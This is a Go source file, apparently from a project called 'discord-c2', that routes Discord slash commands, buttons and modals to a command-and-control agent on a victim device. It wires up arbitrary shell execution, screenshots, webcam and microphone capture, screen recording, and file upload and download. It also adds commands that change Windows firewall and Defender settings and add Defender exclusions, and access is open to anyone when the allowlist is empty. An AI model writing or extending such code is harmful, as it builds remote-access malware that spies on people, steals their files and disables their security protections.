package commands

// This file routes incoming Discord interactions to the feature handlers.

import (
	"runtime"

	"discord-c2/internal/media"

	"github.com/bwmarrin/discordgo"
)

// channelID is the device channel this process controls.
var channelID string

// allowedUsers, when non-empty, restricts control to these Discord user IDs.
var allowedUsers map[string]bool

// SetChannel binds the router to the per-device channel.
func SetChannel(id string) { channelID = id }

// SetAllowedUsers configures an optional authorization allowlist.
func SetAllowedUsers(users map[string]bool) { allowedUsers = users }

// Handle dispatches slash commands, buttons, and modals for this device.
func Handle(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if i.ChannelID != channelID {
		return
	}
	if !userAllowed(interactionUserID(i)) {
		respondEphemeral(s, i, "⛔ You are not authorized to control this device.")
		return
	}

	switch i.Type {
	case discordgo.InteractionApplicationCommand:
		handleSlashCommand(s, i, i.ApplicationCommandData())
	case discordgo.InteractionMessageComponent:
		handleComponent(s, i, i.MessageComponentData())
	case discordgo.InteractionModalSubmit:
		handleModal(s, i, i.ModalSubmitData())
	}
}

func userAllowed(id string) bool {
	return len(allowedUsers) == 0 || allowedUsers[id]
}

func interactionUserID(i *discordgo.InteractionCreate) string {
	if i.Member != nil && i.Member.User != nil {
		return i.Member.User.ID
	}
	if i.User != nil {
		return i.User.ID
	}
	return ""
}

func handleSlashCommand(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	switch data.Name {
	case "help":
		handleSlashHelp(s, i)
	case "cmd":
		handleSlashCmd(s, i, data)
	case GroupMedia:
		handleMediaGroup(s, i, data)
	case GroupFS:
		handleFSGroup(s, i, data)
	case GroupSys:
		handleSysGroup(s, i, data)
	case GroupWin:
		handleWinGroup(s, i, data)
	case GroupDev:
		handleDevGroup(s, i, data)
	case "jobs":
		handleJobsGroup(s, i, data)
	}
}

// subData unwraps the subcommand option Discord sends for grouped commands.
func subData(data discordgo.ApplicationCommandInteractionData) (string, discordgo.ApplicationCommandInteractionData) {
	if len(data.Options) == 0 {
		return "", discordgo.ApplicationCommandInteractionData{}
	}
	o := data.Options[0]
	return o.Name, discordgo.ApplicationCommandInteractionData{
		Name:     o.Name,
		Options:  o.Options,
		Resolved: data.Resolved,
	}
}

func handleMediaGroup(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	name, sub := subData(data)
	switch name {
	case "screenshot":
		handleSlashScreenshot(s, i)
	case "camera":
		handleSlashCamera(s, i)
	case "mic":
		handleSlashMic(s, i, sub)
	case "record":
		handleSlashRecord(s, i, sub)
	case "recordstop":
		handleSlashRecordStop(s, i)
	}
}

func handleFSGroup(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	name, sub := subData(data)
	switch name {
	case "cwd":
		handleSlashCwd(s, i)
	case "ls":
		handleSlashLs(s, i, sub)
	case "download":
		handleSlashDownload(s, i, sub)
	case "upload":
		handleSlashUpload(s, i, sub)
	}
}

func handleSysGroup(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	name, sub := subData(data)
	switch name {
	case "ps":
		handleSlashPs(s, i)
	case "pidinfo":
		handleSlashPidInfo(s, i, sub)
	case "log":
		handleSlashLog(s, i, sub)
	}
}

func handleWinGroup(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	name, sub := subData(data)
	switch name {
	case "sec":
		handleSlashWinSec(s, i)
	case "firewall":
		handleSlashWinFirewall(s, i, sub)
	case "defender":
		handleSlashWinDefender(s, i, sub)
	case "exclude":
		handleSlashWinDefenderExclude(s, i, sub)
	}
}

func handleDevGroup(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	name, _ := subData(data)
	switch name {
	case "restart":
		handleSlashRestart(s, i)
	case "info":
		handleDevInfo(s, i)
	}
}

func handleComponent(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.MessageComponentInteractionData) {
	switch data.CustomID {
	case "d2c_screenshot":
		respondEphemeral(s, i, "📸 Capturing screenshots...")
		media.Screenshot(s, i.ChannelID, interactionRef(i))
	case "d2c_run_cmd":
		respondModal(s, i, "d2c_cmd_modal", "Run command", "d2c_cmd_input", "Shell command", "whoami", "")
	case "d2c_ls":
		respondModal(s, i, "d2c_ls_modal", "List directory", "d2c_ls_input", "ls path", "/path", "ls ")
	case "d2c_q_cwd":
		cmd := "pwd"
		if runtime.GOOS == "windows" {
			cmd = "cd"
		}
		runQuick(s, i, cmd)
	case "d2c_q_whoami":
		runQuick(s, i, "whoami")
	case "d2c_q_id":
		cmd := "id"
		if runtime.GOOS == "windows" {
			cmd = "whoami /user"
		}
		runQuick(s, i, cmd)
	case "d2c_q_hostname":
		runQuick(s, i, "hostname")
	case "d2c_q_ip":
		cmd := "ip addr"
		if runtime.GOOS == "windows" {
			cmd = "ipconfig"
		}
		runQuick(s, i, cmd)
	}
}

func handleModal(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ModalSubmitInteractionData) {
	var inputID string
	switch data.CustomID {
	case "d2c_cmd_modal":
		inputID = "d2c_cmd_input"
	case "d2c_ls_modal":
		inputID = "d2c_ls_input"
	default:
		return
	}

	cmdStr := modalValue(data, inputID)
	if cmdStr == "" {
		respondEphemeral(s, i, "No command provided.")
		return
	}
	startJob(s, i, interactionUserID(i), i.ChannelID, cmdStr)
}

func runQuick(s *discordgo.Session, i *discordgo.InteractionCreate, cmd string) {
	startJob(s, i, interactionUserID(i), i.ChannelID, cmd)
}

func respondEphemeral(s *discordgo.Session, i *discordgo.InteractionCreate, content string) {
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: content,
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func respondModal(s *discordgo.Session, i *discordgo.InteractionCreate, modalID, title, inputID, label, placeholder, value string) {
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseModal,
		Data: &discordgo.InteractionResponseData{
			CustomID: modalID,
			Title:    title,
			Components: []discordgo.MessageComponent{
				discordgo.ActionsRow{
					Components: []discordgo.MessageComponent{
						&discordgo.TextInput{
							CustomID:    inputID,
							Label:       label,
							Style:       discordgo.TextInputShort,
							Placeholder: placeholder,
							Value:       value,
							Required:    true,
						},
					},
				},
			},
		},
	})
}

func interactionRef(i *discordgo.InteractionCreate) *discordgo.MessageReference {
	return &discordgo.MessageReference{
		MessageID: i.Message.ID,
		ChannelID: i.ChannelID,
		GuildID:   i.GuildID,
	}
}

func modalValue(data discordgo.ModalSubmitInteractionData, customID string) string {
	for _, row := range data.Components {
		ar, ok := row.(discordgo.ActionsRow)
		if !ok {
			continue
		}
		for _, c := range ar.Components {
			if input, ok := c.(*discordgo.TextInput); ok && input.CustomID == customID {
				return input.Value
			}
		}
	}
	return ""
}
